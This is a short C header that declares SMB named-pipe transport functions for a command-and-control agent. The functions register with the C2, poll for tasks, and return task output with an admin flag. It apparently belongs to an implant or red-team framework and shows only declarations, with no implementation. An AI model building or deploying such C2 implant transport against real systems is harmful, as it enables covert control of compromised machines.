#pragma once
#include "transport.h"

// Register with C2 via SMB named pipe. Returns 1 on success.
int  transport_smb_register(void);

// Poll for tasks via SMB. Returns heap-allocated array; *count set to number.
AgentTask* transport_smb_beacon(int *count);

// Send result via SMB.
void transport_smb_send_result(long long task_id, const char *output,
                               const char *error, int is_admin);
